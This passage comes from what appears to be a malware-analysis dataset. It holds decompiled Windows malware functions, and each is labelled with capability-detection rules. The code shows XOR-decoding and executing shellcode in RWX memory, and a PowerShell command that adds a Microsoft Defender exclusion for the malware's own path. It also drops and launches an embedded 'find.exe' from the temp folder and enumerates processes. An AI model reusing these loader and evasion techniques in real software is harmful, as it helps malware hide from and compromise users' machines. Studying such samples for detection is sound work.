|| (var_4h == 0)) {\n                return 0;\n            }\n            iVar3 = *piVar2;\n            if (iVar3 == 0) {\n                iVar3 = piVar2[4];\n                iVar5 = iVar3;\n            }\n            else {\n                iVar5 = piVar2[4];\n            }\n            piVar6 = iVar5 + param_1;\n            puVar7 = param_1 + iVar3;\n            uVar4 = *puVar7;\n            pcVar1 = var_1ch;\n            param_1 = var_10h;\n            while (var_1ch = pcVar1,  var_10h = param_1,  uVar4 != 0) {\n                if (uVar4 < 0) {\n                    uVar4 = uVar4 & 0xffff;\n                    puVar8 = NULL;\n                }\n                else {\n                    (*var_18h)(&var_2ch, uVar4 + param_1 + 2);\n                    uVar4 = 0;\n                    puVar8 = &var_2ch;\n                }\n                iVar3 = (*var_8h)(var_4h, puVar8, uVar4, &var_ch);\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                if (var_ch == 0) {\n                    return 0;\n                }\n                puVar7 = puVar7 + 1;\n                *piVar6 = var_ch;\n                piVar6 = piVar6 + 1;\n                pcVar1 = var_1ch;\n                param_1 = var_10h;\n                uVar4 = *puVar7;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 754
    },
    "00410969": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00410969(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint lpString2;\n    \n    uVar3 = 0;\n    var_8h = param_1;\n    lpString2 = param_2;\n    iVar1 = fcn.0041064e(0, &var_8h);\n    if ((iVar1 != 0) && (var_8h = *(iVar1 + 0x20) + param_1,  *(iVar1 + 0x18) != 0)) {\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(var_8h + uVar3 * 4) + param_1, lpString2);\n            if (iVar2 == 0) {\n                return *(*(iVar1 + 0x1c) + param_1 + *(*(iVar1 + 0x24) + uVar3 * 2 + param_1) * 4) + param_1;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *(iVar1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "00410ac3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410ac3(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x28) = 0;\n    *(in_ECX + 0x2c) = 0;\n    fcn.00405f10(0x28);\n    fcn.00402f91(arg_8h + *(in_ECX + 0xc), *(in_ECX + 0x10));\n    return;\n}\n",
        "token_count": 113
    },
    "00410af9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00410af9(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    puVar2 = arg_8h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *in_ECX = *puVar2;\n        puVar2 = puVar2 + 1;\n        in_ECX = in_ECX + 1;\n    }\n    fcn.00402e93(arg_8h + 10);\n    return;\n}\n",
        "token_count": 156
    },
    "00410bd9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00410bd9(uint *lpApplicationName, uint *lpCommandLine)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_54h;\n    uint var_10h;\n    \n    fcn.00401052(&var_54h, 0, 0x44);\n    var_54h = 0x44;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (*lpApplicationName, *lpCommandLine, 0, 0, 0, 0, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *in_ECX = var_10h;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 172
    },
    "00411936": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00411936(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    char16_t *arg_10h;\n    uint lpflOldProtect;\n    \n    lpflOldProtect = param_1;\n    puVar1 = fcn.00401085(0x800);\n    iVar2 = 0x601;\n    puVar5 = puVar1;\n    do {\n        *puVar5 = puVar5[0x416070 - puVar1] ^ 0x45;\n        puVar5 = puVar5 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(puVar1, 2000, 0x40, &lpflOldProtect);\n    iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0x1fe, 0x1000, 0x40);\n    (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryW)(iVar3, 0x104);\n    arg_10h = L\"\\\\System32\\\\cmd.exe\";\n    iVar2 = iVar3;\n    iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenW)(iVar3, L\"\\\\System32\\\\cmd.exe\", 0x28);\n    fcn.0040102c(iVar3 + iVar4 * 2, iVar2, arg_10h);\n    (*(puVar1 + 0xef))(iVar3, param_1, 0, 0);\n    return;\n}\n",
        "token_count": 374
    },
    "00411ca2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode * fcn.00411ca2(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *arg_ch;\n    bool bVar3;\n    uint var_4h;\n    \n    arg_ch = fcn.00411ca2;\n    var_4h = 0x905a4d;\n    iVar2 = 0;\n    while (iVar1 = fcn.00401000(&var_4h, arg_ch, 4),  iVar1 != 0) {\n        iVar1 = iVar2 + 1;\n        arg_ch = arg_ch + -1;\n        bVar3 = iVar2 != 999;\n        iVar2 = 0;\n        if (bVar3) {\n            iVar2 = iVar1;\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 175
    },
    "00411dc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411dc0(int32_t arg_8h)\n\n{\n    uint lpString2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = 0;\n    if (arg_8h != 0) {\n        lpString2 = fcn.00401085(arg_8h + 2);\n        fcn.00405f31(arg_8h + 2);\n        fcn.00405f10(arg_8h);\n        arg_8h_00 = fcn.004035e5(lpString2);\n        fcn.00403437(arg_8h_00);\n        fcn.00405ea5();\n        fcn.00401099(lpString2);\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00411e8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00411e8c(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    int32_t lpflOldProtect;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    lpflOldProtect = param_1;\n    var_4h = param_2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2, 0x1000, 4);\n    puVar2 = (var_4h - 1) + param_1;\n    do {\n        *(uVar3 + iVar1) = ~*puVar2;\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + -1;\n    } while (uVar3 <= var_4h);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(iVar1, var_4h, 0x40, &lpflOldProtect);\n    return iVar1;\n}\n",
        "token_count": 244
    },
    "00411f13": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "allocate memory",
            "allocate RWX memory",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d"
        ],
        "decompiled_code": "\nvoid fcn.00411f13(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint var_60h;\n    uint var_14h;\n    uint uStack20;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(&var_4h);\n    iVar2 = (*_sym.imp.KERNEL32.dll_IsWow64Process)(uVar1);\n    if (iVar2 != 0) {\n        if (var_4h == 0) {\n            iVar2 = fcn.004120b8();\n            if (iVar2 == 0) {\n                return;\n            }\n        }\n        else {\n            iVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, 0xff, 0x1000, 0x40);\n            (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(iVar3, 0x104);\n            uVar1 = 0x41493c;\n            iVar2 = iVar3;\n            iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(iVar3, 0x41493c, 0x14);\n            fcn.0040102c(iVar4 + iVar3, iVar2, uVar1);\n            fcn.00401052(&var_60h, 0, 0x44);\n            var_14h = 0;\n            uStack20 = 0;\n            var_ch = 0;\n            uStack12 = 0;\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(iVar3, 0, 0, 0, 0, 0x8000000, 0, 0, &var_60h, &var_14h);\n            if (iVar2 == 0) {\n                return;\n            }\n            (*_sym.imp.KERNEL32.dll_Sleep)(1000);\n        }\n        fcn.00411fd8();\n    }\n    return;\n}\n",
        "token_count": 470
    },
    "004120b8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate processes/f67bedfed7e245aa9b0908c198426ab8",
            "contain loop",
            "enumerate processes"
        ],
        "decompiled_code": "\nuint fcn.004120b8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_128h;\n    uint var_120h;\n    uint var_104h;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n    fcn.00401052(&var_128h, 0, 0x128);\n    var_128h = 0x128;\n    iVar2 = (*_sym.imp.KERNEL32.dll_Process32First)(uVar1, &var_128h);\n    while( true ) {\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar1);\n            return 0;\n        }\n        iVar2 = fcn.00401144(&var_104h, 0x417370);\n        if (iVar2 == 0) break;\n        iVar2 = (*_sym.imp.KERNEL32.dll_Process32Next)(uVar1, &var_128h);\n    }\n    return var_120h;\n}\n",
        "token_count": 237
    },
    "00412524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412524(uint arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00401000(arg_ch, 0x4145b0, 0x10);\n    if ((iVar1 != 0) && (iVar1 = fcn.00401000(arg_ch, 0x414570, 0x10),  iVar1 != 0)) {\n        return 0x80004002;\n    }\n    *arg_10h = arg_8h;\n    return 0;\n}\n",
        "token_count": 133
    },
    "004125f6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004125f6(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    arg_8h = arg_8h + 0x10;\n    iVar1 = fcn.00401000(arg_8h, 0x414620, 0x10);\n    if (iVar1 == 0) {\n        *(in_ECX + 4) = 0x10;\n    }\n    else {\n        iVar1 = fcn.00401000(arg_8h, 0x414610, 0x10);\n        if (iVar1 == 0) {\n            *(in_ECX + 4) = 0x18;\n        }\n        else {\n            iVar1 = fcn.00401000(arg_8h, 0x414600, 0x10);\n            if (iVar1 == 0) {\n                *(in_ECX + 4) = 0x20;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "0041265c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041265c(uint *param_1)\n\n{\n    *param_1 = 0x4173dc;\n    fcn.00405ea5();\n    (*_sym.imp.KERNEL32.dll_VirtualFree)(param_1[3], 0, 0x8000);\n    return;\n}\n",
        "token_count": 72
    },
    "0041273a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041273a(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint var_d4h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint uStack140;\n    uint uStack136;\n    uint uStack132;\n    uint var_7ch;\n    uint uStack124;\n    uint var_74h;\n    uint uStack116;\n    uchar auStack72 [4];\n    uint var_40h;\n    uint var_3ch;\n    uint var_36h;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    \n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    var_8h = NULL;\n    var_ch = NULL;\n    piVar4 = NULL;\n    var_10h = NULL;\n    piVar3 = NULL;\n    var_14h = NULL;\n    (*_sym.imp.ole32.dll_CoCreateInstance)(0x4145a0, 0, 1, 0x417410, &var_14h);\n    if (var_14h != NULL) {\n        (***var_14h)(var_14h, 0x414580, &var_ch);\n        if (var_ch != NULL) {\n            (**(*var_ch + 4))(var_ch);\n            fcn.00412a6b();\n            if (var_8h == NULL) goto code_r0x004128bb;\n            (*pcVar1)(0x4145f0, 0, 1, 0x417400, &var_10h);\n            if (var_10h != NULL) {\n                (**(*var_10h + 0xc))(var_10h, var_8h, L\"Source\");\n                (**(*var_10h + 0xc))(var_10h, var_ch, L\"Grabber\");\n                fcn.00401052(&var_8ch, 0, 0x48);\n                var_8ch = *0x414630;\n                uStack140 = *0x414634;\n                uStack136 = *0x414638;\n                uStack132 = *0x41463c;\n                var_7ch = *0x414610;\n                uStack124 = *0x414614;\n                var_74h = *0x414618;\n                uStack116 = *0x41461c;\n                (**(*var_14h + 0x10))(var_14h, &var_8ch);\n                piVar4 = fcn.00412688();\n                if (piVar4 != NULL) {\n                    piVar3 = fcn.004126a4();\n                    if (piVar3 != NULL) {\n                        iVar2 = (**(*var_10h + 0x2c))(var_10h, piVar4, piVar3);\n                        if (-1 < iVar2) {\n                            (**(*var_14h + 0x14))(var_14h, &var_d4h);\n                            fcn.0040102c(auStack72 + ((var_90h + 0x30) - var_90h) + -0x30, var_90h + 0x30, 0x28);\n                            fcn.004124eb();\n                            fcn.00412b2a(arg_8h, var_3ch, var_40h, var_36h);\n                        }\n                    }\n                }\n            }\n        }\n    }\n    if (var_8h != NULL) {\n        (**(*var_8h + 8))(var_8h);\n        var_8h = NULL;\n    }\ncode_r0x004128bb:\n    if (var_ch != NULL) {\n        (**(*var_ch + 8))(var_ch);\n        var_ch = NULL;\n    }\n    if (var_10h != NULL) {\n        (**(*var_10h + 8))(var_10h);\n        var_10h = NULL;\n    }\n    if (var_14h != NULL) {\n        (**(*var_14h + 8))(var_14h);\n        var_14h = NULL;\n    }\n    if (piVar4 != NULL) {\n        (**(*piVar4 + 8))(piVar4);\n    }\n    if (piVar3 != NULL) {\n        (**(*piVar3 + 8))(piVar3);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    return;\n}\n",
        "token_count": 1048
    },
    "00412f76": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412f76(int32_t **arg_8h)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    int32_t in_ECX;\n    \n    arg_8h_00 = **arg_8h;\n    arg_8h_01 = fcn.00411dc0(arg_8h_00);\n    fcn.00403437(arg_8h_01);\n    fcn.00405ea5();\n    *(in_ECX + 4) = *(*arg_8h + arg_8h_00 + 4);\n    return;\n}\n",
        "token_count": 139
    },
    "00412fd7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.00412fd7(void)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h;\n    uint uVar2;\n    int32_t iVar3;\n    \n    iVar1 = fcn.00401085(0x100);\n    arg_8h = fcn.00401085(0x100);\n    fcn.00401052(iVar1, 0, 0x100);\n    fcn.00401052(arg_8h, 0, 0x100);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, iVar1, 0x100);\n    uVar2 = fcn.00401133(\"powershell Add-MpPreference -ExclusionPath \");\n    fcn.0040102c(arg_8h, \"powershell Add-MpPreference -ExclusionPath \", uVar2);\n    fcn.0040102c(arg_8h + 0x2b, iVar1, 3);\n    iVar1 = iVar1 + 0xff;\n    uVar2 = 1;\n    iVar3 = fcn.00401133(arg_8h);\n    fcn.0040102c(iVar3 + arg_8h, iVar1, uVar2);\n    (*_sym.imp.KERNEL32.dll_WinExec)(arg_8h, 0);\n    return;\n}\n",
        "token_count": 297
    },
    "0041306f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041306f(int32_t *arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t in_ECX;\n    \n    *(in_ECX + 4) = **arg_8h;\n    arg_8h_00 = fcn.00411dc0(*(*arg_8h + 4));\n    fcn.00403437(arg_8h_00);\n    fcn.00405ea5();\n    return;\n}\n",
        "token_count": 107
    },
    "004130b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create or open file",
            "get common file path",
            "write file on Windows",
            "extract resource via kernel32 functions",
            "write and execute a file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004130b3(uint *arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    uint var_c44h;\n    uint var_844h;\n    uint var_444h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint *var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint *var_4h;\n    \n    var_4h = in_ECX + 4;\n    uVar3 = fcn.00411dc0(**arg_8h);\n    fcn.00403437(uVar3);\n    fcn.00405ea5();\n    uVar3 = (*_sym.imp.KERNEL32.dll_LoadResource)(0, arg_8h);\n    uVar4 = (*_sym.imp.KERNEL32.dll_SizeofResource)(0, arg_8h);\n    uVar3 = (*_sym.imp.KERNEL32.dll_LockResource)(uVar3);\n    fcn.00401052(&var_444h, 0, 0x400);\n    fcn.00401052(&var_844h, 0, 0x400);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetTempPathA;\n    (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x400, &var_444h);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrcatA;\n    (*_sym.imp.KERNEL32.dll_lstrcatA)(&var_444h, \"find.exe\");\n    (*pcVar1)(0x400, &var_844h);\n    (*pcVar2)(&var_844h, \"find.db\");\n    uVar5 = (*_sym.imp.KERNEL32.dll_CreateFileA)(&var_444h, 0x10000000, 1, 0, 2, 0x84, 0);\n    (*_sym.imp.KERNEL32.dll_WriteFile)(uVar5, uVar3, uVar4, &var_8h, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar5);\n    fcn.00401052(&var_c44h, 0, 0x400);\n    (*_sym.imp.USER32.dll_wsprintfA)(&var_c44h, \"-w %ws -d C -f %s\", *var_4h, &var_844h);\n    var_34h = &var_444h;\n    var_44h = 0x3c;\n    var_30h = &var_c44h;\n    var_40h = 0x40;\n    _var_20h = 0;\n    _var_18h = 0;\n    _var_10h = 0;\n    var_3ch = 0;\n    var_38h = 0;\n    var_2ch = 0;\n    var_28h = 0;\n    var_24h = 0;\n    (*_sym.imp.SHELL32.dll_ShellExecuteExA)(&var_44h);\n    return;\n}\n",
        "token_count": 773
    },
    "00413251": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00413251(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t arg_8h_00;\n    uint var_81ch;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.00401052(&var_81ch, 0, 0x400);\n    (*_sym.imp.KERNEL32.dll_GetTempPathW)(0x400, &var_81ch);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_81ch, 0x41748c);\n    arg_8h_00 = in_ECX + 4;\n    uVar1 = fcn.004035e5(&var_81ch);\n    fcn.00403437(uVar1);\n    fcn.00405ea5();\n    var_18h = 0;\n    var_1ch = 0x35;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00403761(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665(arg_8h_00, uVar1);\n    return arg_8h;\n}\n",
        "token_count": 310
    },
    "004136e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004136e0(uint arg_8h)\n\n{\n    uint *arg_8h_00;\n    uint uVar1;\n    uint var_224h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.00401052(&var_224h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x1c, 0, 0, &var_224h);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(&var_224h, L\"\\\\Microsoft Vision\\\\\");\n    fcn.0040346a(&var_224h);\n    arg_8h_00 = &var_4h;\n    var_1ch = 0x3b;\n    var_18h = 0;\n    _var_14h = ZEXT816(0);\n    uVar1 = arg_8h;\n    fcn.00403761(arg_8h_00);\n    fcn.00403679(arg_8h_00);\n    fcn.00403665(arg_8h_00, uVar1);\n    fcn.00405ea5();\n    return arg_8h;\n}\n",
        "token_count": 306
    },
    "00413b3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00413b3c(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint lpString2;\n    uint lpString2_00;\n    uint lpString2_01;\n    uint lpString2_02;\n    uint arg_8h;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00402550();\n    fcn.00402550();\n    fcn.00402550();\n    fcn.00402550();\n    fcn.00402550();\n    fcn.00402550();\n    *0x54d018 = 0;\n    *0x54d034 = 0;\n    *0x54d050 = 0;\n    *0x54d06c = 0;\n    *0x54d088 = 0;\n    *0x54d0a4 = 0;\n    uVar1 = fcn.00401085(0x19);\n    uVar2 = fcn.00401085(0x19);\n    lpString2 = fcn.00401085(0x19);\n    lpString2_00 = fcn.00401085(0x19);\n    lpString2_01 = fcn.00401085(0x19);\n    lpString2_02 = fcn.00401085(0x19);\n    fcn.00411ce2();\n    fcn.00411ce2();\n    fcn.00411ce2();\n    fcn.00411ce2();\n    fcn.00411ce2();\n    fcn.00411ce2();\n    uVar1 = fcn.004033bf(uVar1);\n    fcn.0040fda5(uVar1);\n    fcn.00405ea5();\n    uVar1 = extraout_ECX;\n    arg_8h = fcn.004033bf(uVar2);\n    fcn.0040fda5(arg_8h);\n    fcn.00405ea5(arg_8h, uVar2, uVar1);\n    uVar1 = extraout_ECX_00;\n    uVar2 = fcn.004033bf(lpString2);\n    fcn.0040fda5(uVar2);\n    fcn.00405ea5(uVar2, lpString2, uVar1);\n    uVar1 = extraout_ECX_01;\n    uVar2 = fcn.004033bf(lpString2_00);\n    fcn.0040fda5(uVar2);\n    fcn.00405ea5(uVar2, lpString2_00, uVar1);\n    uVar1 = extraout_ECX_02;\n    uVar2 = fcn.004033bf(lpString2_01);\n    fcn.0040fda5(uVar2);\n    fcn.00405ea5(uVar2, lpString2_01, uVar1);\n    uVar1 = extraout_ECX_03;\n    uVar2 = fcn.004033bf(lpString2_02);\n    fcn.0040fda5(uVar2);\n    fcn.00405ea5(uVar2, lpString2_02, uVar1);\n    return 0x54d000;\n}\n",
        "token_count": 765
    },
    "00413d6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413d6e(uint arg_8h)\n\n{\n    fcn.00402e93(&arg_8h);\n    fcn.00403036();\n    return;\n}\n",
        "token_count": 45
    },
    "004012d3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012d3(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY32;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x4012ee;\n    fcn.00401534();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe0;\n            fcn.00401581(&stack0xffffffe0, arg_ch);\n            fcn.00401433(arg_8h_00, arg_ch, uStackY32, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 245
    },
    "0040131a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040131a(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x401335;\n    fcn.004016e3();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.00401735(&stack0xffffffe4, arg_ch);\n            fcn.004015c0(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 234
    },
    "00401361": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401361(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStack20 = 0x40137c;\n    fcn.00401875();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffd8;\n            fcn.004018c2(&stack0xffffffd8, arg_ch);\n            fcn.00401776(arg_8h_00, arg_ch, uStack40, uStack36, uStack32);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 249
    },
    "004013a8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004013a8(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    uint32_t arg_ch;\n    uint uStackY28;\n    uint uStackY20;\n    uchar *arg_8h_00;\n    \n    arg_ch = 0;\n    *(in_ECX + 0xc) = 5;\n    *(in_ECX + 4) = 5;\n    *(in_ECX + 8) = 0;\n    uStackY20 = 0x4013c3;\n    fcn.004019f6();\n    if (*(arg_8h + 8) != 0) {\n        do {\n            arg_8h_00 = &stack0xffffffe4;\n            fcn.00401a43(&stack0xffffffe4, arg_ch);\n            fcn.00401903(arg_8h_00, arg_ch, uStackY28);\n            arg_ch = arg_ch + 1;\n        } while (arg_ch < *(arg_8h + 8));\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00401bed": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
